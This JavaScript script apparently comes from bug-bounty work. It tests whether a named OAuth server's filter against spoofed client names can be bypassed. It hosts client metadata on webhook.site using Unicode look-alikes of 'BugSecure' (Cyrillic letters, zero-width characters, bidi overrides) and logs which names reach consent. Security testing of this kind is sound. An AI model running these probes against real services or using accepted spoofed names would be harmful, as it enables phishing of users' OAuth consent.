const AS = "https://bugsecure-api.senintel.sn";
const UUID = "3ef992c0-b173-407f-ab55-e3ea613a534a";
const BASE = "https://webhook.site/" + UUID;
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const F = async (u, o = {}) => { for (let a = 0; a < 3; a++) { try { return await fetch(u, { ...o, signal: AbortSignal.timeout(25000) }); } catch (e) { await sleep(2500); } } return null; };
const vis = (s) => s.replace(/[\u200b-\u200f\u00a0\u00ad\ufeff]/g, (m) => "\\u" + m.codePointAt(0).toString(16).padStart(4, "0"));

// confusables unicode + variantes restantes, testes via le CHEMIN CIMD (pas de quota d inscription)
const VARIANTS = [
  ["BugSecure.Africa", "point"],
  ["bugsecure.africa", "domaine"],
  ["BugSecur\u0435", "cyrillique e (U+0435)"],
  ["BugS\u00e9cur\u00e9", "accents"],
  ["Bug\u200bSecure", "zero width space"],
  ["BugSecure\u00a0Africa", "insécable"],
  ["Bug\u202eSecure", "bidi RLO"],
  ["BugSecure\u202c", "bidi PDF"],
  ["Bug\u00adSecure", "soft hyphen"],
  ["BugSecure\ufeff", "BOM"],
  ["BugSecurit\u00e9", "accent final"],
  ["BugSecure-Africa", "trait d union"],
  ["Bugsec\u0131re", "turc i (dotless)"],
  ["\u202cBugSecure", "bidi initial"],
  ["\u200bBugSecure", "zero width initial"],
  ["BugSecure\u200d", "ZWJ"],
  ["Bug\u0435Secure", "cyrillique initiale"],
  ["Bug Secure Africa", "espaces"],
  ["BugSecur\u0435 Africa", "cyrillique + space"],
  ["\u0411ugSecure", "cyrillique A initiale"],
  ["BugSecure\u2212", "signe moins"],
  ["BugSecure\u2003", "espace em"],
];

console.log("=== filtre anti-usurpation teste par le CHEMIN CIMD (aucun quota d inscription) ===");
const accepted = [];
for (const [name, desc] of VARIANTS) {
  const path = "/conf-" + Date.now() + "-" + Math.random().toString(36).slice(2, 7);
  const doc = { client_id: BASE + path, client_name: name, redirect_uris: [BASE + "/cb"], grant_types: ["authorization_code"], response_types: ["code"], token_endpoint_auth_method: "none" };
  await F("https://webhook.site/token/" + UUID, { method: "PUT", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ default_content: JSON.stringify(doc), default_content_type: "application/json" }) });
  await sleep(900);
  const u = AS + "/oauth/authorize?response_type=code&client_id=" + encodeURIComponent(BASE + path) + "&redirect_uri=" + encodeURIComponent(BASE + "/cb") + "&scope=programs%3Aread&state=bb&code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM&code_challenge_method=S256&resource=" + encodeURIComponent(AS);
  const r = await F(u, { redirect: "manual" });
  const loc = r?.headers.get("location") || "";
  const consent = loc.includes("/oauth/consent");
  const err = (loc.match(/code=([^&]+)/) || [])[1] || "";
  console.log("  " + vis(name).padEnd(26) + "(" + desc.padEnd(20) + ")-> " + (consent ? "*** ACCEPTE (nom usurpe) ***" : "refuse (" + err + ")"));
  if (consent) accepted.push(name);
  await sleep(1500);
}
console.log("\n  CONCLUSIONS : " + (accepted.length ? accepted.length + " variante(s) ACCEPTEE(S) -> " + JSON.stringify(accepted) : "aucune variante de nom usurpe acceptee (filtre robuste, y compris sur le chemin CIMD)"));
